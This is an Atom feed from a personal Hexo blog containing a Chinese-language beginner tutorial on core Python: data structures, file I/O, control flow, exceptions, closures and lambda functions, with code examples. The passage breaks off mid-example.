<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Nero&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-04-06T13:16:27.761Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Nero</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python核心技术（一）</title>
    <link href="http://yoursite.com/2020/04/06/Python%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://yoursite.com/2020/04/06/Python%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2020-04-06T01:36:26.000Z</published>
    <updated>2020-04-06T13:16:27.761Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、Python知识图谱"><a href="#一、Python知识图谱" class="headerlink" title="一、Python知识图谱"></a>一、Python知识图谱</h1><p><img src="python%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1.png" alt="python知识图谱"></p><h1 id="二、数据结构"><a href="#二、数据结构" class="headerlink" title="二、数据结构"></a>二、数据结构</h1><h2 id="1-列表（list）和元组（tuple）"><a href="#1-列表（list）和元组（tuple）" class="headerlink" title="1.列表（list）和元组（tuple）"></a>1.列表（list）和元组（tuple）</h2><p>列表和元组，都是<strong>一个可以放置任意数据类型的有序集合</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>lis = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">"string"</span>,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lis</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">'string'</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tup = (<span class="number">1</span>,<span class="number">2</span>,<span class="string">'string'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tup</span><br><span class="line">(<span class="number">1</span>, <span class="number">2</span>, <span class="string">'string'</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>两者之间的区别：</p><ul><li><strong>列表是动态的</strong>，长度大小不固定，可以随意地增加、删减或者改变元素（mutable）。</li><li><strong>而元组是静态的</strong>，长度大小固定，无法增加删减或者改变（immutable）。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>lis[<span class="number">2</span>] = <span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lis</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="string">'string'</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tup[<span class="number">1</span>] = <span class="number">3</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: <span class="string">'tuple'</span> object does <span class="keyword">not</span> support item assignment</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>当我们试图改变元组内的值时，程序抛出异常。如果当我们需要改变元组内的值时，就只能重新开辟一块内存，创建新的元组了。</p><p>联系;</p><p><strong>Python 中的列表和元组都支持负数索引</strong>，-1 表示最后一个元素，-2 表示倒数第二个元素，以此类推。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>lis[<span class="number">-1</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lis[<span class="number">-2</span>]</span><br><span class="line"><span class="string">'string'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p><strong>列表和元组都支持切片操作</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>lis[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>列表和元组都<strong>可以随意嵌套</strong>：</p><p>两者也可以通过 list() 和 tuple() 函数相互转换：</p><h2 id="2-字典（dict）和集合（set）"><a href="#2-字典（dict）和集合（set）" class="headerlink" title="2.字典（dict）和集合（set）"></a>2.字典（dict）和集合（set）</h2><p>字典是一系列由键（key）和值（value）配对组成的元素的集合，在 Python3.7+，字典被确定为有序（注意：在 3.6 中，字典有序是一个 implementation detail，在 3.7 才正式成为语言特性，因此 3.6 中无法 100% 确保其有序性），而 3.6 之前是无序的，其长度大小可变，元素可以任意地删减和改变。</p><p>而集合和字典基本相同，唯一的区别，就是集合没有键和值的配对，是一系列无序的、唯一的元素组合。</p><p>字典构造方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d1 = &#123;<span class="string">'name'</span>:<span class="string">'jason'</span>,<span class="string">'age'</span>:<span class="number">20</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d2 = dict(&#123;<span class="string">'name'</span>:<span class="string">'jason'</span>,<span class="string">'age'</span>:<span class="number">20</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d3 = dict([(<span class="string">'name'</span>,<span class="string">'jason'</span>),(<span class="string">'age'</span>,<span class="number">20</span>)])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d4 = dict(name = <span class="string">'jason'</span>,age = <span class="number">20</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d1 == d2 == d3 == d4</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><p>集合的构造方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s1 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s2 = set([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s1 == s2</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><p>Python 中字典和集合，无论是键还是值，都可以是混合类型。</p><p>字典访问可以直接索引键，如果不存在，就会抛出异常；也可以使用 get(key, default) 函数来进行索引。如果键不存在，调用 get() 函数可以返回一个默认值。</p><p><strong>集合并不支持索引操作，因为集合本质上是一个哈希表，和列表不一样</strong>。</p><p>想要判断一个元素在不在字典或集合内，我们可以用 value in dict/set 来判断。</p><p>除了创建和访问，字典和集合也同样支持增加、删除、更新等操作</p><h2 id="3-字符串（string）"><a href="#3-字符串（string）" class="headerlink" title="3.字符串（string）"></a>3.字符串（string）</h2><p>字符串是由独立字符组成的一个序列，通常包含在单引号（’’）双引号（””）或者三引号之中（’’’ ‘’’或””” “””，两者一样）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s1 = <span class="string">'hello'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s2 = <span class="string">"hello"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s3 = <span class="string">"""hello"""</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s1 == s2 == s3</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><p>Python 也支持转义字符。所谓的转义字符，就是用反斜杠开头的字符串，来表示一些特定意义的字符。</p><table><thead><tr><th>转义字符</th><th>说明</th></tr></thead><tbody><tr><td>\newline</td><td>接到下一行</td></tr><tr><td>\\</td><td>表示\</td></tr><tr><td>\‘</td><td>表示单引号</td></tr><tr><td>\“</td><td>表示双引号</td></tr><tr><td>\n</td><td>换行</td></tr><tr><td>\t</td><td>横向制表符</td></tr><tr><td>\b</td><td>退格</td></tr><tr><td>\v</td><td>纵向制表符</td></tr></tbody></table><p>可以把字符串想象成一个由单个字符组成的数组，所以，Python 的字符串同样支持索引，切片和遍历等等操作。</p><p>Python 的字符串是不可变的（immutable）。Python 中字符串的改变，通常只能通过创建新的字符串来完成。</p><h1 id="二、输入与输出"><a href="#二、输入与输出" class="headerlink" title="二、输入与输出"></a>二、输入与输出</h1><h2 id="1-基本输入输出"><a href="#1-基本输入输出" class="headerlink" title="1.基本输入输出"></a>1.基本输入输出</h2><p>input() 函数暂停程序运行，同时等待键盘输入；直到回车被按下，函数的参数即为提示语，输入的类型永远是字符串型（str）。</p><p>把 str 强制转换为 int 请用 int()，转为浮点数请用 float()。而在生产环境中使用强制转换时，请记得加上 try except。</p><p>Python 对 int 类型没有最大限制（相比之下， C++ 的 int 最大为 2147483647，超过这个数字会产生溢出），但是对 float 类型依然有精度限制。</p><h2 id="2-文件输入输出"><a href="#2-文件输入输出" class="headerlink" title="2.文件输入输出"></a>2.文件输入输出</h2><p>我们先要用 open() 函数拿到文件的指针。其中，第一个参数指定文件位置（相对位置或者绝对位置）；第二个参数，如果是 <code>&#39;r&#39;</code>表示读取，如果是<code>&#39;w&#39;</code> 则表示写入，当然也可以用 <code>&#39;rw&#39;</code> ，表示读写都要。a 则是一个不太常用（但也很有用）的参数，表示追加（append），这样打开的文件，如果需要写入，会从原始文件的最末尾开始写入。</p><p>我们可以给 read 指定参数 size ，用来表示读取的最大长度。还可以通过 readline() 函数，每次读取一行，这种做法常用于数据挖掘（Data Mining）中的数据清洗，在写一些小的程序时非常轻便。如果每行之间没有关联，这种做法也可以降低内存的压力。而 write() 函数，可以把参数中的字符串输出到文件中，也很容易理解。</p><p>open() 函数对应于 close() 函数，也就是说，如果你打开了文件，在完成读取任务后，就应该立刻关掉它。而如果你使用了 with 语句，就不需要显式调用 close()。在 with 的语境下任务执行完毕后，close() 函数会被自动调用，代码也简洁很多。</p><h1 id="三、条件与循环"><a href="#三、条件与循环" class="headerlink" title="三、条件与循环"></a>三、条件与循环</h1><h2 id="1-条件语句"><a href="#1-条件语句" class="headerlink" title="1.条件语句"></a>1.条件语句</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> condition_1:</span><br><span class="line">    statement_1</span><br><span class="line"><span class="keyword">elif</span> condition_2:</span><br><span class="line">    statement_2</span><br><span class="line">...</span><br><span class="line"><span class="keyword">elif</span> condition_i:</span><br><span class="line">    statement_i</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    statement_n</span><br></pre></td></tr></table></figure><p>if 语句是可以单独使用的，但 elif、else 都必须和 if 成对使用。</p><p>省略的写法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> s: <span class="comment"># s is a string</span></span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">if</span> l: <span class="comment"># l is a list</span></span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">if</span> i: <span class="comment"># i is an int</span></span><br><span class="line">    ...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>判断条件的省略用法：</p><table><thead><tr><th>数据类型</th><th>结果</th></tr></thead><tbody><tr><td>String</td><td>空字符解析为false</td></tr><tr><td>int</td><td>0解析为false</td></tr><tr><td>bool</td><td>True,false</td></tr><tr><td>list/tuple/dict/set</td><td>Iterable为空解析为false</td></tr><tr><td>object</td><td>None解析为false</td></tr></tbody></table><h2 id="2-循环语句"><a href="#2-循环语句" class="headerlink" title="2.循环语句"></a>2.循环语句</h2><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><p>Python 中的数据结构只要是可迭代的（iterable），比如列表、集合等等，那么都可以通过下面这种方式遍历：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> &lt;iterable&gt;:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>这里需要单独强调一下字典。字典本身只有键是可迭代的，如果我们要遍历它的值或者是键值对，就需要通过其内置的函数 values() 或者 items() 实现。其中，values() 返回字典的值的集合，items() 返回键值对的集合。</p><p>通过集合中的索引来遍历元素：</p><p>我们通常通过 range() 这个函数，拿到索引，再去遍历访问集合中的元素。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="number">0</span>, len(l)):</span><br><span class="line">    <span class="keyword">if</span> index &lt; <span class="number">5</span>:</span><br><span class="line">        print(l[index])</span><br></pre></td></tr></table></figure><p>当我们同时需要索引和元素时，还有一种更简洁的方式，那就是通过 Python 内置的函数 enumerate()。用它来遍历集合，不仅返回每个元素，并且还返回其对应的索引，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]</span><br><span class="line"><span class="keyword">for</span> index, item <span class="keyword">in</span> enumerate(l):</span><br><span class="line">    <span class="keyword">if</span> index &lt; <span class="number">5</span>:</span><br><span class="line">        print(item)</span><br></pre></td></tr></table></figure><p>在循环语句中，我们还常常搭配 continue 和 break 一起使用。所谓 continue，就是让程序跳过当前这层循环，继续执行下面的循环；而 break 则是指完全跳出所在的整个循环体。在循环中适当加入 continue 和 break，往往能使程序更加简洁、易读。</p><h3 id="while"><a href="#while" class="headerlink" title="while"></a>while</h3><p>while 循环，原理也是一样的。它表示当 condition 满足时，一直重复循环内部的操作，直到 condition 不再满足，就跳出循环体。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> conditon:</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h1 id="四、异常处理"><a href="#四、异常处理" class="headerlink" title="四、异常处理"></a>四、异常处理</h1><h2 id="1-错误与异常"><a href="#1-错误与异常" class="headerlink" title="1.错误与异常"></a>1.错误与异常</h2><p>错误：一种是语法错误，另一种是异常。</p><p>所谓语法错误，你应该很清楚，也就是你写的代码不符合编程规范，无法被识别与执行；</p><p>而异常则是指程序的语法正确，也可以被执行，但在执行过程中遇到了错误，抛出了异常。</p><h2 id="2-如何处理异常"><a href="#2-如何处理异常" class="headerlink" title="2.如何处理异常"></a>2.如何处理异常</h2><p>使用try expect，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s = input(<span class="string">'please enter two numbers separated by comma: '</span>)</span><br><span class="line">    num1 = int(s.split(<span class="string">','</span>)[<span class="number">0</span>].strip())</span><br><span class="line">    num2 = int(s.split(<span class="string">','</span>)[<span class="number">1</span>].strip())</span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">except</span> ValueError <span class="keyword">as</span> err:</span><br><span class="line">    print(<span class="string">'Value Error: &#123;&#125;'</span>.format(err))</span><br><span class="line"><span class="keyword">except</span> IndexError <span class="keyword">as</span> err:</span><br><span class="line">    print(<span class="string">'Index Error: &#123;&#125;'</span>.format(err))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">    print(<span class="string">'Other error: &#123;&#125;'</span>.format(err))</span><br><span class="line"> </span><br><span class="line">print(<span class="string">'continue'</span>)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="3-用户自定义异常"><a href="#3-用户自定义异常" class="headerlink" title="3.用户自定义异常"></a>3.用户自定义异常</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyInputError</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="string">"""Exception raised when there're errors in input"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, value)</span>:</span> <span class="comment"># 自定义异常类型的初始化</span></span><br><span class="line">        self.value = value</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span> <span class="comment"># 自定义异常类型的 string 表达形式</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"&#123;&#125; is invalid input"</span>.format(repr(self.value)))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">raise</span> MyInputError(<span class="number">1</span>) <span class="comment"># 抛出 MyInputError 这个异常</span></span><br><span class="line"><span class="keyword">except</span> MyInputError <span class="keyword">as</span> err:</span><br><span class="line">    print(<span class="string">'error: &#123;&#125;'</span>.format(err))</span><br></pre></td></tr></table></figure><h1 id="五、函数基础"><a href="#五、函数基础" class="headerlink" title="五、函数基础"></a>五、函数基础</h1><h2 id="1-函数基础"><a href="#1-函数基础" class="headerlink" title="1.函数基础"></a>1.函数基础</h2><p>定义如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(param)</span>:</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>参数可以有默认值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(param = <span class="number">0</span>)</span>:</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>Python 不用考虑输入的数据类型，而是将其交给具体的代码去判断执行，同样的一个函数，可以同时应用在整型、列表、字符串等等的操作中。</p><p>在编程语言中，我们把这种行为称为<strong>多态</strong>。这也是 Python 和其他语言，比如 Java、C 等很大的一个不同点。当然，Python 这种方便的特性，在实际使用中也会带来诸多问题。因此，必要时请你在开头加上数据的类型检查。</p><h2 id="2-函数嵌套"><a href="#2-函数嵌套" class="headerlink" title="2.函数嵌套"></a>2.函数嵌套</h2><p>Python 函数的另一大特性，是 Python 支持函数的嵌套。所谓的函数嵌套，就是指函数里面又有函数，比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'hello'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">f2</span><span class="params">()</span>:</span></span><br><span class="line">        print(<span class="string">'world'</span>)</span><br><span class="line">    f2()</span><br><span class="line">f1()</span><br></pre></td></tr></table></figure><p>函数的嵌套，主要有下面两个方面的作用：</p><p>第一，函数的嵌套能够保证内部函数的隐私。内部函数只能被外部函数所调用和访问，不会暴露在全局作用域，因此，如果你的函数内部有一些隐私数据（比如数据库的用户、密码等），不想暴露在外，那你就可以使用函数的的嵌套，将其封装在内部函数中，只通过外部函数来访问。</p><p>第二，合理的使用函数嵌套，能够提高程序的运行效率。</p><h2 id="3-闭包"><a href="#3-闭包" class="headerlink" title="3.闭包"></a>3.闭包</h2><p>闭包其实和刚刚讲的嵌套函数类似，不同的是，这里外部函数返回的是一个函数，而不是一个具体的值。返回的函数通常赋于一个变量，这个变量可以在后面被继续执行调用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nth_power</span><span class="params">(exponent)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exponent_of</span><span class="params">(base)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> base ** exponent</span><br><span class="line">    <span class="keyword">return</span> exponent_of <span class="comment"># 返回值是 exponent_of 函数</span></span><br><span class="line"> </span><br><span class="line">square = nth_power(<span class="number">2</span>) <span class="comment"># 计算一个数的平方</span></span><br><span class="line">cube = nth_power(<span class="number">3</span>) <span class="comment"># 计算一个数的立方 </span></span><br><span class="line">square</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line">&lt;function __main__.nth_power.&lt;locals&gt;.exponent(base)&gt;</span><br><span class="line"> </span><br><span class="line">cube</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line">&lt;function __main__.nth_power.&lt;locals&gt;.exponent(base)&gt;</span><br><span class="line"> </span><br><span class="line">print(square(<span class="number">2</span>))  <span class="comment"># 计算 2 的平方</span></span><br><span class="line">print(cube(<span class="number">2</span>)) <span class="comment"># 计算 2 的立方</span></span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"><span class="number">4</span> <span class="comment"># 2^2</span></span><br><span class="line"><span class="number">8</span> <span class="comment"># 2^3</span></span><br></pre></td></tr></table></figure><p>作用：</p><p>1.提高代码可读性</p><p>2.闭包常常和装饰器（decorator）一起使用。</p><h1 id="六、匿名函数"><a href="#六、匿名函数" class="headerlink" title="六、匿名函数"></a>六、匿名函数</h1><h2 id="1-匿名函数基础"><a href="#1-匿名函数基础" class="headerlink" title="1.匿名函数基础"></a>1.匿名函数基础</h2><p>首先，什么是匿名函数呢？以下是匿名函数的格式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lambda</span> argument1, argument2,... argumentN : expression</span><br></pre></td></tr></table></figure><p>我们可以看到，匿名函数的关键字是 lambda，之后是一系列的参数，然后用冒号隔开，最后则是由这些参数组成的表达式。我们通过几个例子看一下它的用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">square = <span class="keyword">lambda</span> x: x**<span class="number">2</span></span><br><span class="line">square(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>这里的匿名函数只输入一个参数 x，输出则是输入 x 的平方。因此当输入是 3 时，输出便是 9。如果把这个匿名函数写成常规函数的形式，则是下面这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">square</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x**<span class="number">2</span></span><br><span class="line">square(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>可以看到，匿名函数 lambda 和常规函数一样，返回的都是一个函数对象（function object）</p><p><strong>第一，lambda 是一个表达式（expression），并不是一个语句（statement）</strong>。</p><ul><li>所谓的表达式，就是用一系列“公式”去表达一个东西，比如<code>x + 2</code>、 <code>x**2</code>等等；</li><li>而所谓的语句，则一定是完成了某些功能，比如赋值语句<code>x = 1</code>完成了赋值，print 语句<code>print(x)</code>完成了打印，条件语句 <code>if x &lt; 0:</code>完成了选择功能等等。</li></ul><p>因此，lambda 可以用在一些常规函数 def 不能用的地方，比如，lambda 可以用在列表内部，而常规函数却不能：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[(<span class="keyword">lambda</span> x: x*x)(x) <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>)]</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>]</span><br></pre></td></tr></table></figure><p>再比如，lambda 可以被用作某些函数的参数，而常规函数 def 也不能：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">l = [(<span class="number">1</span>, <span class="number">20</span>), (<span class="number">3</span>, <span class="number">0</span>), (<span class="number">9</span>, <span class="number">10</span>), (<span class="number">2</span>, <span class="number">-1</span>)]</span><br><span class="line">l.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>]) <span class="comment"># 按列表中元祖的第二个元素排序</span></span><br><span class="line">print(l)</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line">[(<span class="number">2</span>, <span class="number">-1</span>), (<span class="number">3</span>, <span class="number">0</span>), (<span class="number">9</span>, <span class="number">10</span>), (<span class="number">1</span>, <span class="number">20</span>)]</span><br></pre></td></tr></table></figure><p>常规函数 def 必须通过其函数名被调用，因此必须首先被定义。但是作为一个表达式的 lambda，返回的函数对象就不需要名字了。</p><p><strong>第二，lambda 的主体是只有一行的简单表达式，并不能扩展成一个多行的代码块。</strong></p><p>这其实是出于设计的考虑。Python 之所以发明 lambda，就是为了让它和常规函数各司其职：lambda 专注于简单的任务，而常规函数则负责更复杂的多行逻辑。</p><p>匿名函数通常的使用场景是：程序中需要使用一个函数完成一个简单的功能，并且该函数只调用一次。</p><h2 id="2-Python-函数式编程"><a href="#2-Python-函数式编程" class="headerlink" title="2.Python 函数式编程"></a>2.Python 函数式编程</h2><p>所谓函数式编程，是指代码中每一块都是不可变的（immutable），都由纯函数（pure function）的形式组成。这里的纯函数，是指函数本身相互独立、互不影响，对于相同的输入，总会有相同的输出，没有任何副作用。</p><p>举个很简单的例子，比如对于一个列表，我想让列表中的元素值都变为原来的两倍，我们可以写成下面的形式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multiply_2</span><span class="params">(l)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="number">0</span>, len(l)):</span><br><span class="line">        l[index] *= <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> l</span><br></pre></td></tr></table></figure><p>这段代码就不是一个纯函数的形式，因为列表中元素的值被改变了，如果我多次调用 multiply_2() 这个函数，那么每次得到的结果都不一样。要想让它成为一个纯函数的形式，就得写成下面这种形式，重新创建一个新的列表并返回。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multiply_2_pure</span><span class="params">(l)</span>:</span></span><br><span class="line">    new_list = 